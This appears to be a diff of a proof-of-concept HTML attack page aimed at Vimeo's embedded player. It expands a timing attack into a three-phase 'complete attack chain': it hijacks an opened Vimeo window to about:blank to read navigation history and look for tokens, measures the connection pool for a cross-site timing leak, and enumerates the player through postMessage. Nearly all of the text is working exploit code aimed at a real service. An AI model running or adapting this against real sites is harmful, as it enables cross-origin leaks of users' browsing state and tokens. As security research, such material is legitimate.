@@ -1,115 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Vimeo Timing Attack</title>
+    <title>Vimeo Complete Attack Chain</title>
 </head>
 <body>
-    <h1>⏱️ Vimeo Connection Pool Timing Attack</h1>
-    <button onclick="startAttack()">Start Attack</button>
-    <div id="results"></div>
+    <h1>🎯 Complete Vimeo Attack</h1>
+    <button onclick="fullAttack()">Execute Full Attack</button>
+    <pre id="log"></pre>
 
     <script>
-        const results = document.getElementById('results');
-        
+        const logEl = document.getElementById('log');
         function log(msg) {
-            results.innerHTML += `<p>${msg}</p>`;
+            logEl.textContent += msg + '\n';
             console.log(msg);
         }
-        
-        async function startAttack() {
-            log('🎯 Starting timing attack...');
+
+        async function fullAttack() {
+            log('=== PHASE 1: Navigation API Attack ===');
+            await navigationAttack();
             
-            // Step 1: Load Vimeo iframe (this makes the auth request)
+            log('\n=== PHASE 2: Timing Attack ===');
+            await timingAttack();
+            
+            log('\n=== PHASE 3: PostMessage Enumeration ===');
+            await postMessageAttack();
+        }
+
+        async function navigationAttack() {
+            return new Promise((resolve) => {
+                log('Opening Vimeo in new window...');
+                const win = window.open('https://player.vimeo.com/video/935884964', 'vimeo');
+                
+                setTimeout(() => {
+                    log('Hijacking to about:blank...');
+                    win.location = 'about:blank';
+                    
+                    setTimeout(() => {
+                        try {
+                            if (win.navigation && win.navigation.entries) {
+                                const entries = win.navigation.entries();
+                                log(`✅ Extracted ${entries.length} navigation entries`);
+                                
+                                entries.forEach((entry, i) => {
+                                    log(`  [${i}] ${entry.url}`);
+                                    
+                                    // Check for tokens in URL
+                                    const url = new URL(entry.url);
+                                    if (url.search.includes('token') || url.hash.includes('token')) {
+                                        log(`  🚨 POTENTIAL TOKEN FOUND`);
+                                    }
+                                });
+                                
+                                // Read window.name
+                                if (win.name) {
+                                    log(`Window name: ${win.name}`);
+                                }
+                                
+                            } else {
+                                log('❌ Navigation API not available');
+                            }
+                            
+                            // Close the window
+                            win.close();
+                            
+                        } catch(e) {
+                            log(`❌ Error: ${e.message}`);
+                        }
+                        
+                        resolve();
+                    }, 2000);
+                }, 3000);
+            });
+        }
+
+        async function timingAttack() {
+            // Load iframe that makes authenticated request
             const iframe = document.createElement('iframe');
             iframe.src = 'https://player.vimeo.com/video/935884964';
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
             
-            // Step 2: Wait a moment, then start timing measurements
-            setTimeout(() => {
-                measureTimings();
-            }, 1000);
-        }
-        
-        async function measureTimings() {
-            log('📊 Measuring connection timings...');
+            await new Promise(r => setTimeout(r, 2000));
             
-            // Request static resource from player.vimeo.com in blocks of 6
-            const staticResource = 'https://player.vimeo.com/static/proxy.html';
-            const blockSize = 6;
-            const totalRequests = 20;
-            
+            log('Measuring connection pool...');
             const timings = [];
             
-            for (let block = 0; block < Math.ceil(totalRequests / blockSize); block++) {
-                const blockTimings = [];
-                const promises = [];
+            // Make 12 requests in blocks of 6
+            for (let i = 0; i < 12; i++) {
+                const start = performance.now();
+                await fetch(`https://player.vimeo.com/static/proxy.html?_=${Date.now()}_${i}`, 
+                    { mode: 'no-cors' }
+                ).catch(() => {});
+                const duration = performance.now() - start;
+                timings.push(duration);
                 
-                for (let i = 0; i < blockSize; i++) {
-                    const requestNum = block * blockSize + i;
-                    if (requestNum >= totalRequests) break;
-                    
-                    const start = performance.now();
-                    
-                    // Add cache buster
-                    const url = `${staticResource}?_=${Date.now()}_${requestNum}`;
-                    
-                    const promise = fetch(url, { mode: 'no-cors' })
-                        .then(() => {
-                            const duration = performance.now() - start;
-                            blockTimings.push(duration);
-                            return duration;
-                        })
-                        .catch(e => {
-                            blockTimings.push(null);
-                            return null;
-                        });
-                    
-                    promises.push(promise);
+                if ((i + 1) % 6 === 0) {
+                    await new Promise(r => setTimeout(r, 100));
                 }
-                
-                await Promise.all(promises);
-                timings.push(...blockTimings);
-                
-                // Small delay between blocks
-                await new Promise(r => setTimeout(r, 100));
             }
             
-            analyzeTimings(timings);
-        }
-        
-        function analyzeTimings(timings) {
-            log('📈 Analysis:');
+            const avg = timings.reduce((a,b) => a+b) / timings.length;
+            log(`Average timing: ${avg.toFixed(2)}ms`);
             
-            timings.forEach((time, i) => {
-                if (time === null) {
-                    log(`Request ${i}: FAILED`);
-                } else {
-                    log(`Request ${i}: ${time.toFixed(2)}ms`);
+            const slow = timings.filter(t => t > avg * 1.33);
+            if (slow.length > 0) {
+                log(`🚨 ${slow.length} slow requests detected (background XHR active)`);
+            }
+            
+            iframe.remove();
+        }
+
+        async function postMessageAttack() {
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://player.vimeo.com/video/935884964';
+            document.body.appendChild(iframe);
+            
+            await new Promise(r => setTimeout(r, 3000));
+            
+            log('Testing postMessage methods...');
+            
+            window.addEventListener('message', (e) => {
+                if (e.origin === 'https://player.vimeo.com') {
+                    log(`Response: ${JSON.stringify(e.data)}`);
                 }
             });
             
-            // Look for requests that took significantly longer
-            const validTimings = timings.filter(t => t !== null);
-            const avg = validTimings.reduce((a, b) => a + b, 0) / validTimings.length;
-            const stdDev = Math.sqrt(
-                validTimings.reduce((sum, t) => sum + Math.pow(t - avg, 2), 0) / validTimings.length
-            );
+            const methods = ['getVideoUrl', 'getVideoEmbedCode', 'getCurrentTime'];
+            methods.forEach(method => {
+                iframe.contentWindow.postMessage({ method }, '*');
+            });
             
-            log(`Average: ${avg.toFixed(2)}ms`);
-            log(`Std Dev: ${stdDev.toFixed(2)}ms`);
-            
-            // Find outliers (requests that took >133% of average)
-            const outliers = timings
-                .map((time, i) => ({ time, index: i }))
-                .filter(({ time }) => time !== null && time > avg * 1.33);
-            
-            if (outliers.length > 0) {
-                log(`🚨 Found ${outliers.length} slow requests (potential sign of background XHR):`);
-                outliers.forEach(({ time, index }) => {
-                    log(`  Request ${index}: ${time.toFixed(2)}ms (${(time/avg*100).toFixed(0)}% of average)`);
-                });
-            }
+            await new Promise(r => setTimeout(r, 2000));
+            iframe.remove();
         }
     </script>
 </body>
